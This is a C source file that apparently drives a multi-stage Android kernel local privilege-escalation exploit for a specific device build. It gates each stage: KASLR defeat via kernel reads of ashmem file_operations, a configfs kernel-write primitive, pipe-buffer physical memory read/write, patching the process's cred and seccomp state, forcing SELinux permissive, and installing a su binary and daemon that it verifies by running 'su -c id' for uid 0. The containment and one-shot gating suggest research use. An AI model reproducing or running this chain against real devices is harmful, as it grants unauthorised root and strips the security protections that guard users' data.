#include "common.h"
#include "rootchain_bridge.h"

#include <dirent.h>
#include <signal.h>
#include <sys/stat.h>

#define ROOTCHAIN_BUILD_LABEL "rootchain_bridge_alioth_419_run22gate1_20260916"
#define ROOTCHAIN_MM_PATH_ENV "ROOTCHAIN_MM_PATH"
#define ROOTCHAIN_MM_DEFAULT_PATH "/data/local/tmp/ks_mm_answer.txt"
#define ROOTCHAIN_MM_BOOT_ID_PATH_ENV "ROOTCHAIN_MM_BOOT_ID_PATH"
#define ROOTCHAIN_MM_BOOT_ID_DEFAULT_PATH "/data/local/tmp/ks_mm_boot_id.txt"
#define ROOTCHAIN_RUN22_GATE_PATH_ENV "ROOTCHAIN_RUN22_GATE_PATH"
#define ROOTCHAIN_RUN22_GATE_DEFAULT_PATH "/data/local/tmp/ks_run22_gate.txt"
#define ROOTCHAIN_BOOT_LOCK "/data/local/tmp/rootchain_bridge_boot.lock"
#define ROOTCHAIN_MANIFEST_PATH_ENV "ROOTCHAIN_MANIFEST_PATH"
#define ROOTCHAIN_MANIFEST_DEFAULT_PATH "/data/local/tmp/rootchain_manifest.txt"
#define ROOTCHAIN_ARTIFACT_PATH_ENV "ROOTCHAIN_ARTIFACT_PATH"
#define ROOTCHAIN_PIPE_PAGE_ENV "KS_ROOTCHAIN_PIPE_PAGE"
#define ROOTCHAIN_PIPE_BOOT_ENV "KS_ROOTCHAIN_PIPE_BOOT_ID"
#define ROOTCHAIN_SU_LOCAL "/data/local/tmp/su"
#define ROOTCHAIN_SU_SOCK "/data/local/tmp/temp_su.sock"
#define ROOTCHAIN_SU_LOG "/data/local/tmp/su_daemon.log"
#define ROOTCHAIN_PROOF_OFF 0x7000
#define ROOTCHAIN_PHYS64_OFF 0x100
#define ROOTCHAIN_READ_TAG "nebusec_70687973727730"
#define ROOTCHAIN_WRITE_TAG "nebusec_70687973727731"
#define ROOTCHAIN_PHYS64_SEED 0x306365737562656eULL
#define ROOTCHAIN_PHYS64_NEXT 0x316365737562656eULL
#define ROOTCHAIN_SHELL_WAIT_MS 6000

static int failed_gate = -1;
static int su_daemon_pid = -1;
extern uintptr_t g_direct_map_base;
extern uintptr_t g_direct_map_end;

static const char *rootchain_path(const char *env_name,
                                  const char *default_path) {
  const char *path = getenv(env_name);
  return (path && *path) ? path : default_path;
}

static void rootchain_fail(int gate, const char *reason) {
  failed_gate = gate;
  pr_error("ROOTCHAIN gate=%d FAIL reason=%s same_boot_retry=0\n",
           gate, reason);
  pr_info("ROOTCHAIN verdict=FAIL gate=%d reason=%s\n", gate, reason);
}

static int read_file_head(const char *path, char *buf, size_t len) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  ssize_t got;
  if (fd < 0) {
    return 0;
  }
  memset(buf, 0, len);
  got = read(fd, buf, len - 1);
  close(fd);
  return got > 0;
}

static int read_boot_id(char *buf, size_t len) {
  if (!read_file_head("/proc/sys/kernel/random/boot_id", buf, len)) {
    return 0;
  }
  buf[strcspn(buf, "\r\n")] = 0;
  return strlen(buf) >= 8;
}

static int boot_id_canonical(const char *id) {
  static const unsigned char hyphens[] = {8, 13, 18, 23};
  size_t len = strlen(id);
  if (len != 36) {
    return 0;
  }
  for (size_t i = 0; i < sizeof(hyphens); ++i) {
    if (id[hyphens[i]] != '-') {
      return 0;
    }
  }
  for (size_t i = 0; i < len; ++i) {
    if (i == 8 || i == 13 || i == 18 || i == 23) {
      continue;
    }
    if (!((id[i] >= '0' && id[i] <= '9') ||
          (id[i] >= 'a' && id[i] <= 'f'))) {
      return 0;
    }
  }
  return 1;
}

static int read_canonical_boot_id(char *buf, size_t len) {
  return read_boot_id(buf, len) && boot_id_canonical(buf);
}

static uint64_t boot_btime(void) {
  char buf[2048];
  const char *p;
  if (!read_file_head("/proc/stat", buf, sizeof(buf))) {
    return 0;
  }
  p = strstr(buf, "\nbtime ");
  if (!p) {
    return 0;
  }
  return (uint64_t)strtoull(p + 7, NULL, 10);
}

static int gate_mm_boot_contract(const struct stat *mm_st,
                                 const char *current_boot) {
  unsigned char buf[64];
  size_t n;
  const char *companion_path = rootchain_path(ROOTCHAIN_MM_BOOT_ID_PATH_ENV,
                                              ROOTCHAIN_MM_BOOT_ID_DEFAULT_PATH);
  int fd = open(companion_path, O_RDONLY | O_CLOEXEC);
  struct stat st;
  int format_ok;
  uint64_t btime = boot_btime();

  if (fd < 0) {
    pr_error("ROOTCHAIN mm boot contract open=FAIL path=%s errno=%d\n",
             companion_path, errno);
    return 0;
  }
  n = (size_t)read(fd, buf, sizeof(buf));
  if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode)) {
    pr_error("ROOTCHAIN mm boot contract stat=FAIL path=%s\n",
             companion_path);
    close(fd);
    return 0;
  }
  close(fd);
  if (n != 45) {
    pr_error("ROOTCHAIN mm boot contract len=%zu want=45\n", n);
    return 0;
  }
  format_ok = memcmp(buf, "boot_id=", 8) == 0 &&
              memcmp(buf + 8, current_boot, 36) == 0 &&
              buf[44] == '\n';
  if (!format_ok || !boot_id_canonical((const char *)buf + 8)) {
    pr_error("ROOTCHAIN mm boot contract boot_scope=BAD current=%s\n",
             current_boot);
    return 0;
  }
  if (btime == 0 || (uint64_t)st.st_mtime < btime ||
      (uint64_t)mm_st->st_mtime < btime) {
    pr_error("ROOTCHAIN mm boot contract mtime=BAD mm=%lld companion=%lld "
             "btime=%llu\n", (long long)mm_st->st_mtime,
             (long long)st.st_mtime, (unsigned long long)btime);
    return 0;
  }
  pr_info("ROOTCHAIN mm boot contract boot=%s mm_mtime=%lld "
          "companion_mtime=%lld gate=PASS\n", current_boot,
          (long long)mm_st->st_mtime, (long long)st.st_mtime);
  return 1;
}

static int gate_run22_contract(const struct stat *mm_st, uintptr_t mm,
                               const char *current_boot) {
  unsigned char buf[128];
  size_t n;
  const char *gate_path = rootchain_path(ROOTCHAIN_RUN22_GATE_PATH_ENV,
                                         ROOTCHAIN_RUN22_GATE_DEFAULT_PATH);
  int fd = open(gate_path, O_RDONLY | O_CLOEXEC);
  struct stat st;
  char mm_hex[24];
  int boot_ok;
  int mm_ok;
  int t2c_ok;
  int c2t_ok;
  int c2c_ok;
  uint64_t btime = boot_btime();

  snprintf(mm_hex, sizeof(mm_hex), "0x%016zx", (size_t)mm);
  if (fd < 0) {
    pr_error("ROOTCHAIN run22 contract open=FAIL path=%s errno=%d\n",
             gate_path, errno);
    return 0;
  }
  n = (size_t)read(fd, buf, sizeof(buf));
  if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode)) {
    pr_error("ROOTCHAIN run22 contract stat=FAIL path=%s\n",
             gate_path);
    close(fd);
    return 0;
  }
  close(fd);
  if (n != 94) {
    pr_error("ROOTCHAIN run22 contract len=%zu want=94\n", n);
    return 0;
  }
  boot_ok = memcmp(buf, "boot_id=", 8) == 0 &&
            memcmp(buf + 8, current_boot, 36) == 0 && buf[44] == '\n';
  mm_ok = memcmp(buf + 45, "mm=0x", 5) == 0 &&
          memcmp(buf + 50, mm_hex + 2, 16) == 0 && buf[66] == '\n';
  t2c_ok = memcmp(buf + 67, "t2c=PASS\n", 9) == 0;
  c2t_ok = memcmp(buf + 76, "c2t=PASS\n", 9) == 0;
  c2c_ok = memcmp(buf + 85, "c2c=PASS\n", 9) == 0;
  if (!c2c_ok) {
    pr_error("ROOTCHAIN run22 contract c2c=FAIL\n");
    return 0;
  }
  if (!boot_ok || !mm_ok || !t2c_ok || !c2t_ok) {
    pr_error("ROOTCHAIN run22 contract format=BAD want=boot_id/mm/t2c/c2t/c2c "
             "mm_answer=%s\n", mm_hex);
    return 0;
  }
  if (btime == 0 || (uint64_t)st.st_mtime < btime ||
      (uint64_t)mm_st->st_mtime < btime) {
    pr_error("ROOTCHAIN run22 contract mtime=BAD mm=%lld gate=%lld "
             "btime=%llu\n", (long long)mm_st->st_mtime,
             (long long)st.st_mtime, (unsigned long long)btime);
    return 0;
  }
  pr_info("ROOTCHAIN run22 contract boot=%s mm=%s t2c=PASS c2t=PASS "
          "c2c=PASS gate=PASS\n", current_boot, mm_hex);
  return 1;
}

static uint64_t ram_bytes(void) {
  char buf[2048];
  unsigned long long kb = 0;
  const char *p;
  if (!read_file_head("/proc/meminfo", buf, sizeof(buf))) {
    return 0;
  }
  p = strstr(buf, "MemTotal:");
  if (!p || sscanf(p, "MemTotal: %llu kB", &kb) != 1 || !kb) {
    return 0;
  }
  return (uint64_t)kb * 1024ULL;
}

static int residue_process_present(void) {
  DIR *dir = opendir("/proc");
  struct dirent *de;
  int found = 0;
  if (!dir) {
    return 1;
  }
  while ((de = readdir(dir)) != NULL) {
    char *end = NULL;
    long pid = strtol(de->d_name, &end, 10);
    char path[64];
    char comm[32];
    if (!end || *end || pid <= 1) {
      continue;
    }
    snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
    read_first_line(path, comm, sizeof(comm));
    if (!strcmp(comm, "ll_root_child") || !strcmp(comm, "ksud") ||
        !strcmp(comm, "rootchain_bridge") || !strcmp(comm, "su")) {
      pr_error("ROOTCHAIN residue process pid=%ld comm=%s\n", pid, comm);
      found = 1;
      break;
    }
  }
  closedir(dir);
  return found;
}

static int gate_clean_boot(void) {
  char loadavg[128] = "";
  double one = 0;
  double five = 0;
  uint64_t btime = boot_btime();
  if (!read_file_head("/proc/loadavg", loadavg, sizeof(loadavg)) ||
      sscanf(loadavg, "%lf %lf", &one, &five) != 2 ||
      one >= 2.0 || five >= 2.0) {
    pr_error("ROOTCHAIN clean boot load=%s\n", loadavg);
    return 0;
  }
  if (!btime || residue_process_present()) {
    return 0;
  }
  pr_info("ROOTCHAIN clean boot load1=%.2f load5=%.2f btime=%llu gate=PASS\n",
          one, five, (unsigned long long)btime);
  return 1;
}

static int hex_digit(unsigned char c, unsigned *out) {
  if (c >= '0' && c <= '9') {
    *out = (unsigned)(c - '0');
    return 1;
  }
  if (c >= 'a' && c <= 'f') {
    *out = (unsigned)(c - 'a' + 10);
    return 1;
  }
  return 0;
}

static int gate_mm_contract(uintptr_t *mm_out) {
  unsigned char buf[64];
  size_t n;
  const char *mm_path = rootchain_path(ROOTCHAIN_MM_PATH_ENV,
                                       ROOTCHAIN_MM_DEFAULT_PATH);
  int fd = open(mm_path, O_RDONLY | O_CLOEXEC);
  struct stat st;
  uint64_t btime = boot_btime();
  uint64_t ram = ram_bytes();
  uintptr_t mm = 0;
  int eol_ok;
  char boot_id[128];

  *mm_out = 0;
  if (fd < 0) {
    return 0;
  }
  n = (size_t)read(fd, buf, sizeof(buf));
  if (fstat(fd, &st) != 0) {
    close(fd);
    return 0;
  }
  close(fd);
  if (n != 22 && n != 23) {
    pr_error("ROOTCHAIN mm contract len=%zu want=22/23\n", n);
    return 0;
  }
  eol_ok = n == 22 ? buf[21] == '\n'
                   : (buf[21] == '\r' && buf[22] == '\n');
  if (!eol_ok || memcmp(buf, "mm=0x", 5) != 0) {
    pr_error("ROOTCHAIN mm contract format=BAD\n");
    return 0;
  }
  if (!read_canonical_boot_id(boot_id, sizeof(boot_id))) {
    pr_error("ROOTCHAIN mm boot contract current_boot=BAD\n");
    return 0;
  }
  if (!gate_mm_boot_contract(&st, boot_id)) {
    return 0;
  }
  for (size_t i = 5; i < n - 1; ++i) {
    unsigned digit;
    if (!hex_digit(buf[i], &digit)) {
      pr_error("ROOTCHAIN mm contract hex=BAD byte=%u\n", (unsigned)buf[i]);
      return 0;
    }
    mm = (mm << 4) | digit;
  }
  if (!gate_run22_contract(&st, mm, boot_id)) {
    return 0;
  }
  if ((mm & 0x3f) != 0 || mm < g_direct_map_base ||
      mm >= g_direct_map_end || ram == 0 || mm - P0_PAGE_OFFSET >= ram) {
    pr_error("ROOTCHAIN mm contract alignment/window=BAD mm=%016zx "
             "ram=%016llx\n", mm, (unsigned long long)ram);
    return 0;
  }
  {
    static const uintptr_t rejected[] = {
      0xffffffe585065e00ULL,
      0xffffffd5b5c69380ULL,
      0xffffffc02cd1ea00ULL,
    };
    for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); ++i) {
      if (mm == rejected[i]) {
        pr_error("ROOTCHAIN mm contract rejected_mm=%016zx\n", mm);
        return 0;
      }
    }
  }
  if (btime == 0 || (uint64_t)st.st_mtime < btime) {
    pr_error("ROOTCHAIN mm contract boot_scope=BAD mtime=%lld btime=%llu\n",
             (long long)st.st_mtime, (unsigned long long)btime);
    return 0;
  }
  *mm_out = mm;
  pr_info("ROOTCHAIN mm contract len=%zu mm=%016zx boot_scope=PASS gate=PASS\n",
          n, mm);
  return 1;
}

static int gate_provenance(void) {
  const char *artifact = getenv(ROOTCHAIN_ARTIFACT_PATH_ENV);
  char manifest[4096] = "";
  char sha[128] = "";
  char line[512];
  unsigned long long want_size = 0;
  unsigned long long want_entry = 0;
  struct stat st;
  int out[2] = {-1, -1};
  pid_t pid;
  int status = 0;
  ssize_t got;
  size_t used = 0;
  int ok = 0;
  int have_size = 0;
  int have_sha = 0;
  int have_entry = 0;

  if (!artifact || !*artifact || stat(artifact, &st) != 0 ||
      !S_ISREG(st.st_mode)) {
    pr_error("ROOTCHAIN provenance artifact=%s\n", artifact ? artifact : "");
    return 0;
  }
  const char *manifest_path = rootchain_path(ROOTCHAIN_MANIFEST_PATH_ENV,
                                             ROOTCHAIN_MANIFEST_DEFAULT_PATH);
  if (!read_file_head(manifest_path, manifest, sizeof(manifest))) {
    pr_error("ROOTCHAIN provenance manifest=%s\n", manifest_path);
    return 0;
  }
  for (char *p = manifest; p; p = strchr(p, '\n')) {
    char *end = strchr(p, '\n');
    if (end) *end = 0;
    if (sscanf(p, "size=%llu", &want_size) == 1) {
      have_size = 1;
    }
    if (sscanf(p, "sha256=%127s", sha) == 1) {
      have_sha = 1;
    }
    if (sscanf(p, "entry=0x%llx", &want_entry) == 1) {
      have_entry = 1;
    }
    p = end ? end + 1 : NULL;
  }
  if (!have_size || !have_sha || !have_entry || strlen(sha) != 64 ||
      strspn(sha, "0123456789abcdefABCDEF") != 64 || !want_entry ||
      !want_size || (size_t)want_size != st.st_size) {
    pr_error("ROOTCHAIN provenance manifest=BAD size=%llu want=%llu\n",
             (unsigned long long)st.st_size, want_size);
    return 0;
  }
  if (pipe(out) != 0) return 0;
  pid = fork();
  if (pid == 0) {
    close(out[0]);
    dup2(out[1], STDOUT_FILENO);
    close(out[1]);
    execl("/system/bin/sha256sum", "sha256sum", artifact, (char *)NULL);
    execl("/system/bin/toybox", "toybox", "sha256sum", artifact,
          (char *)NULL);
    _exit(127);
  }
  close(out[1]);
  out[1] = -1;
  while (waitpid(pid, &status, WNOHANG) == 0) usleep(10000);
  got = read(out[0], line, sizeof(line) - 1);
  close(out[0]);
  if (got > 0) used = (size_t)got;
  line[used] = 0;
  ok = WIFEXITED(status) && WEXITSTATUS(status) == 0 && used >= 64 &&
       strncasecmp(line, sha, 64) == 0;
  pr_info("ROOTCHAIN provenance size=%llu entry=0x%llx sha256=%s gate=%s\n",
          want_size, want_entry, sha, ok ? "PASS" : "FAIL");
  return ok;
}

static int take_boot_attempt(void) {
  char boot_id[128];
  char old_boot[128];
  char old[256];
  int fd;
  ssize_t wrote;
  if (!read_boot_id(boot_id, sizeof(boot_id))) {
    return 0;
  }
  if (read_file_head(ROOTCHAIN_BOOT_LOCK, old, sizeof(old)) &&
      sscanf(old, "boot_id=%127s", old_boot) == 1 &&
      !strcmp(old_boot, boot_id)) {
    pr_error("ROOTCHAIN provenance prior_attempt_boot=%s\n", old_boot);
    return 0;
  }
  fd = open(ROOTCHAIN_BOOT_LOCK, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
            0666);
  if (fd < 0) {
    return 0;
  }
  wrote = dprintf(fd, "boot_id=%s\npid=%d\n", boot_id, getpid());
  close(fd);
  return wrote > 0;
}

static int gate_configfs_primitive(int fd) {
  const char payload[] = "ROOTCHAIN_CONFIGFS_PRIMITIVE_OK";
  char readback[sizeof(payload)];
  ssize_t wr;
  ssize_t rd;
  int wr_errno;
  int rd_errno;

  memset(readback, 0, sizeof(readback));
  errno = 0;
  wr = kernel_write_data(fd, binwrite_target, payload, sizeof(payload));
  wr_errno = errno;
  pr_info("ROOTCHAIN configfs write target=%016zx ret=%zd errno=%d\n",
          binwrite_target, wr, wr_errno);
  if (wr != (ssize_t)sizeof(payload) || wr_errno != 0) {
    return 0;
  }
  errno = 0;
  rd = configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  rd_errno = errno;
  pr_info("ROOTCHAIN configfs read target=%016zx ret=%zd errno=%d "
          "compare=%s\n", binwrite_target, rd, rd_errno,
          (rd == (ssize_t)sizeof(readback) &&
           memcmp(readback, payload, sizeof(payload)) == 0) ? "PASS" : "FAIL");
  return rd == (ssize_t)sizeof(readback) && rd_errno == 0 &&
         memcmp(readback, payload, sizeof(payload)) == 0 &&
         repair_fake_fops_llseek(fd);
}

static int count_kaslr_hits(int fd, uintptr_t *base_out) {
  uintptr_t target = data_addr(ASHMEM_FOPS);
  uint64_t open_ptr = kernel_read64(fd, target + FOPS_OPEN_OFF);
  uintptr_t base;
  int hits = 0;
  if (!is_kernel_ptr(open_ptr)) {
    *base_out = 0;
    return 0;
  }
  base = open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  if ((base & 0x1fffffULL) != 0 ||
      base < KIMAGE_TEXT_BASE ||
      base >= KIMAGE_TEXT_BASE + 0x200000000ULL) {
    *base_out = 0;
    return 0;
  }
  for (uintptr_t candidate = KIMAGE_TEXT_BASE;
       candidate < KIMAGE_TEXT_BASE + 0x200000000ULL;
       candidate += 0x200000ULL) {
    uint64_t candidate_open = kernel_read64(
      fd, candidate + ASHMEM_FOPS_OFF + FOPS_OPEN_OFF);
    if (is_kernel_ptr(candidate_open) &&
        candidate_open - (ASHMEM_OPEN - KIMAGE_TEXT_BASE) == candidate) {
      hits++;
      base = candidate;
    }
  }
  *base_out = hits == 1 ? base : 0;
  return hits;
}

static int verify_kaslr_pointers(int fd, uintptr_t base) {
  uintptr_t fops = base + ASHMEM_FOPS_OFF;
  uint64_t ioctl = kernel_read64(fd, fops + FOPS_IOCTL_OFF);
  uint64_t mmap = kernel_read64(fd, fops + FOPS_MMAP_OFF);
  uint64_t release = kernel_read64(fd, fops + FOPS_RELEASE_OFF);
  uint64_t show = kernel_read64(fd, fops + FOPS_SHOW_FDINFO_OFF);
  int pass = is_kernel_ptr(ioctl) && is_kernel_ptr(mmap) &&
             is_kernel_ptr(release) && is_kernel_ptr(show) &&
             ioctl == base + (ASHMEM_IOCTL - KIMAGE_TEXT_BASE) &&
             mmap == base + (ASHMEM_MMAP - KIMAGE_TEXT_BASE) &&
             release == base + (ASHMEM_RELEASE - KIMAGE_TEXT_BASE) &&
             show == base + (ASHMEM_SHOW_FDINFO - KIMAGE_TEXT_BASE);
  pr_info("ROOTCHAIN kaslr verify ioctl=%016llx mmap=%016llx "
          "release=%016llx show_fdinfo=%016llx compare=%s\n",
          (unsigned long long)ioctl, (unsigned long long)mmap,
          (unsigned long long)release, (unsigned long long)show,
          pass ? "PASS" : "FAIL");
  return pass;
}

static int gate_kaslr(int fd) {
  uintptr_t base = 0;
  int hits = count_kaslr_hits(fd, &base);
  uint64_t old_ioctl = 0;
  uint64_t new_ioctl = 0;
  int refreshed;
  int pass;

  if (hits != 1 || base == 0) {
    pr_error("ROOTCHAIN kaslr scan hits=%d base=%016zx\n", hits, base);
    return 0;
  }
  pr_info("ROOTCHAIN kaslr scan hit base=%016zx slide=%016llx\n",
          base, (unsigned long long)(base - KIMAGE_TEXT_BASE));
  kaslr_base = base;
  kaslr_slide = base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_step = 0;
  if (!verify_kaslr_pointers(fd, base)) {
    return 0;
  }
  old_ioctl = kernel_read64(fd, fake_fops + FOPS_IOCTL_OFF);
  refreshed = refresh_fake_fops_text(fd);
  new_ioctl = kernel_read64(fd, fake_fops + FOPS_IOCTL_OFF);
  pass = refreshed && new_ioctl == text_addr(ASHMEM_IOCTL) &&
         old_ioctl != new_ioctl;
  pr_info("ROOTCHAIN fake fops text refresh ok=%d ioctl=%016llx->%016llx "
          "gate=%s\n", refreshed, (unsigned long long)old_ioctl,
          (unsigned long long)new_ioctl, pass ? "PASS" : "FAIL");
  return pass;
}

static int gate_linear_map(void) {
  int fd = open_ashmem_device();
  int64_t memstart_signed = 0;
  uint64_t memstart = 0;
  uintptr_t want_base;
  uintptr_t page_ptr;
  uintptr_t page_back;
  int roundtrip;
  int cache_evidence;
  int pass;
  uint64_t slab_cache;
  if (fd < 0) {
    return 0;
  }
  memstart = kernel_read64(fd, kaslr_base + MEMSTART_ADDR_OFF);
  memcpy(&memstart_signed, &memstart, sizeof(memstart_signed));
  want_base = (uintptr_t)((int64_t)P0_PAGE_OFFSET - memstart_signed);
  page_ptr = direct_to_page(page_base);
  page_back = page_to_direct(page_ptr);
  roundtrip = page_back == (page_base & ~(PAGE_SIZE - 1));
  cache_evidence = pipe_reclaim_cache_gate(fd);
  slab_cache = kernel_read64(fd, pipebuf_page_base + STRUCT_SLAB_CACHE_OFF);
  pass = memstart != 0 && want_base == g_direct_map_base &&
         g_direct_map_base == P0_PAGE_OFFSET && roundtrip &&
         is_direct_ptr(page_base) && page_ptr >= VMEMMAP_START &&
         cache_evidence;
  pr_info("ROOTCHAIN direct map calibrated memstart=%016llx base=%016llx "
          "delta=0 roundtrip=%d page=%016llx page_type=%016llx match=%s\n",
          (unsigned long long)memstart,
          (unsigned long long)g_direct_map_base, roundtrip,
          (unsigned long long)page_ptr, (unsigned long long)slab_cache,
          cache_evidence ? "PASS" : "FAIL");
  close(fd);
  return pass;
}

static int gate_pipe_physrw(int fd) {
  return install_pipe_physrw(fd);
}

static int contain_su(pid_t daemon_pid) {
  if (root_shared && daemon_pid > 0) {
    atomic_store(&root_shared->su_cleanup, 1);
    for (int i = 0; i < 5000 && !atomic_load(&root_shared->su_cleanup_done);
         ++i) {
      usleep(1000);
    }
  }
  unlink(ROOTCHAIN_SU_SOCK);
  int cleaned = !root_shared || daemon_pid <= 0 ||
                atomic_load(&root_shared->su_cleanup_done);
  pr_info("ROOTCHAIN su containment daemon=%d cleaned=%d socket_removed=1 "
          "log=%s\n", daemon_pid, cleaned, ROOTCHAIN_SU_LOG);
  return cleaned;
}

static int root_report_ok(void) {
  const struct root_report *r = root_shared ? &root_shared->report : NULL;
  return r && r->uid_before != 0 && r->uid_after == 0 &&
         r->gid_after == 0 && r->euid_after == 0 && r->egid_after == 0 &&
         r->setgid_ret == 0 && r->setuid_ret == 0 &&
         r->setenforce_ret == 0 && r->su_install_ret == 1 &&
         r->su_install_errno == 0 && r->su_daemon_pid > 0;
}

static void log_root_markers(int pass) {
  const struct root_report *r = root_shared ? &root_shared->report : NULL;
  if (!r) {
    return;
  }
  pr_info("ROOTCHAIN root task task=%016llx pid=%u tgid=%u comm=%s\n",
          (unsigned long long)current_task_addr, found_task_pid,
          found_task_tgid, found_task_comm);
  pr_info("ROOTCHAIN root cred task=%016llx cred=%016llx "
          "real_cred=%016llx security=%016llx\n",
          (unsigned long long)current_task_addr,
          (unsigned long long)current_cred_addr,
          (unsigned long long)current_real_cred_addr,
          (unsigned long long)current_cred_security_addr);
  pr_info("ROOTCHAIN root seccomp patched ok=%d mode=0/0 filter=0/0 "
          "flags_clear=1 nnp_clear=1\n", pass);
  pr_info("ROOTCHAIN root cred patched uid=%u/%u sid=%u/%u caps_verify=%s\n",
          r->uid_before, r->uid_after, cred_sid_before, cred_sid_after,
          pass ? "PASS" : "FAIL");
  pr_info("ROOTCHAIN root selinux direct write ok=%d %u->%u\n",
          pass, selinux_before, selinux_after);
  pr_info("ROOTCHAIN root child result done=%d uid_after=%u setgid=%d/%d "
          "setuid=%d/%d setenforce=%d/%d su=%d/%d daemon=%d "
          "selinux=%u->%u\n", root_child_done, r->uid_after,
          r->setgid_ret, r->setgid_errno, r->setuid_ret, r->setuid_errno,
          r->setenforce_ret, r->setenforce_errno, r->su_install_ret,
          r->su_install_errno, r->su_daemon_pid,
          selinux_before, selinux_after);
}

static int run_su_identity(void) {
  int out[2] = {-1, -1};
  pid_t pid;
  char output[4096];
  size_t used = 0;
  int status = 0;
  int timed_out = 0;
  int elapsed_ms = 0;
  int rc = -1;
  ssize_t got;

  if (pipe(out) != 0) {
    goto done;
  }
  pid = fork();
  if (pid < 0) {
    goto done;
  }
  if (pid == 0) {
    close(out[0]);
    dup2(out[1], STDOUT_FILENO);
    dup2(out[1], STDERR_FILENO);
    close(out[1]);
    execl("/system/bin/timeout", "timeout", "5", ROOTCHAIN_SU_LOCAL,
          "-c", "id", (char *)NULL);
    execlp("timeout", "timeout", "5", ROOTCHAIN_SU_LOCAL, "-c", "id",
           (char *)NULL);
    _exit(127);
  }
  close(out[1]);
  out[1] = -1;
  while (waitpid(pid, &status, WNOHANG) == 0) {
    usleep(10000);
    elapsed_ms += 10;
    if (elapsed_ms >= ROOTCHAIN_SHELL_WAIT_MS) {
      timed_out = 1;
      kill(pid, SIGKILL);
      waitpid(pid, &status, 0);
      break;
    }
  }
  got = read(out[0], output, sizeof(output) - 1);
  if (got > 0) {
    used = (size_t)got;
  }
  output[used] = 0;
  if (WIFEXITED(status)) {
    rc = WEXITSTATUS(status);
  }
  int ok = !timed_out && rc == 0 &&
           strstr(output, "uid=0(root) gid=0(root)") != NULL;
  pr_info("ROOTCHAIN shell id cmd=\"timeout 5 /data/local/tmp/su -c id\" "
          "rc=%d uid=0(root) gid=0(root) timed_out=%d output=%s\n",
          ok ? 0 : -1, timed_out, output);
  close(out[0]);
  return ok;

done:
  if (out[0] >= 0) close(out[0]);
  if (out[1] >= 0) close(out[1]);
  pr_error("ROOTCHAIN shell id setup failed errno=%d\n", errno);
  return 0;
}

static int gate_root(int fd) {
  int installed = install_android_root(fd);
  if (root_shared && root_shared->report.su_daemon_pid > 0) {
    su_daemon_pid = root_shared->report.su_daemon_pid;
  }
  log_root_markers(installed && root_report_ok());
  return installed && root_report_ok() && selinux_after == 0;
}

static int parse_pipe_export(void) {
  const char *page_env = getenv(ROOTCHAIN_PIPE_PAGE_ENV);
  const char *boot_env = getenv(ROOTCHAIN_PIPE_BOOT_ENV);
  char boot_id[128];
  uintptr_t page;
  if (!page_env && !boot_env) {
    pr_info("ROOTCHAIN pipe export mode=internal-leak gate=PASS\n");
    return 1;
  }
  if (!page_env || !*page_env || !boot_env || !*boot_env ||
      !read_boot_id(boot_id, sizeof(boot_id)) ||
      strcmp(boot_env, boot_id) != 0) {
    pr_error("ROOTCHAIN pipe export page=%s boot_scope=BAD\n",
             page_env ? "provided" : "missing");
    return 0;
  }
  page = (uintptr_t)strtoull(page_env, NULL, 0);
  if ((page & (PAGE_SIZE - 1)) != 0 || !is_direct_ptr(page) ||
      (page & (ORDER3_SIZE - 1)) != 0) {
    pr_error("ROOTCHAIN pipe export page=%s alignment/window=BAD\n", page_env);
    return 0;
  }
  pr_info("ROOTCHAIN pipe export page=%016zx boot_scope=PASS\n", page);
  return 1;
}

int rootchain_bridge_run(void) {
  uintptr_t mm = 0;
  int fd = -1;

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  init_ashmem_path();
  unsetenv("KS_LINEAR_DELTA");
  unsetenv("KS_MM_START");
  unsetenv("KS_MM_END");
  setenv("KS_ROOTCHAIN_STRICT", "1", 1);

  if (!gate_provenance()) {
    rootchain_fail(0, "provenance");
    return 2;
  }
  if (!take_boot_attempt()) {
    rootchain_fail(0, "boot-attempt-lock");
    return 2;
  }
  if (!gate_clean_boot()) {
    rootchain_fail(1, "clean-boot");
    return 2;
  }
  if (!gate_mm_contract(&mm)) {
    rootchain_fail(2, "mm-contract");
    return 2;
  }
  set_cached_leaked_mm(mm);
  if (!parse_pipe_export()) {
    rootchain_fail(2, "pipe-export");
    return 2;
  }
  pr_info("ROOTCHAIN header build=%s mode=one-shot mm=%016zx page=0\n",
          ROOTCHAIN_BUILD_LABEL, mm);

  if (slide_h1a_s3_test() != 0) {
    rootchain_fail(8, "s3-chain-gates-3-8");
    return 2;
  }
  pr_info("ROOTCHAIN s3 write proof gate=PASS\n");

  fd = open_ashmem_device();
  if (fd < 0) {
    rootchain_fail(9, "post-s3-ashmem-open");
    return 2;
  }
  if (!gate_kaslr(fd)) {
    rootchain_fail(10, "kaslr");
    return 2;
  }
  if (!gate_configfs_primitive(fd)) {
    rootchain_fail(9, "configfs-primitive");
    return 2;
  }
  int pipe_env_present = getenv(ROOTCHAIN_PIPE_PAGE_ENV) &&
                         getenv(ROOTCHAIN_PIPE_BOOT_ENV);
  if (!pipe_env_present) {
    unsetenv("KS_ROOTCHAIN_STRICT");
  }
  pipebuf_page_base = prepare_pipe_buffer_page();
  setenv("KS_ROOTCHAIN_STRICT", "1", 1);
  if (!pipebuf_page_base) {
    rootchain_fail(11, "pipe-page");
    return 2;
  }
  if (!gate_linear_map()) {
    rootchain_fail(11, "linear-map");
    return 2;
  }
  if (!gate_pipe_physrw(fd)) {
    rootchain_fail(12, "pipe-physrw");
    return 2;
  }
  if (!gate_root(fd)) {
    rootchain_fail(13, "root-patch");
    return 2;
  }
  if (!run_su_identity()) {
    rootchain_fail(15, "su-shell-proof");
    return 2;
  }
  if (!contain_su(su_daemon_pid)) {
    rootchain_fail(15, "su-containment");
    return 2;
  }
  pr_info("ROOTCHAIN verdict=PASS gates=16 containment=daemon-stopped "
          "mount=persist-until-reboot\n");
  close(fd);
  return 0;
}

#ifndef KS_BUILD_CLOSED_LOOP
int main(void) {
  int rc = rootchain_bridge_run();
  if (rc != 0) {
    contain_su(su_daemon_pid);
  }
  fflush(stdout);
  fflush(stderr);
  return rc;
}
#endif /* !KS_BUILD_CLOSED_LOOP */
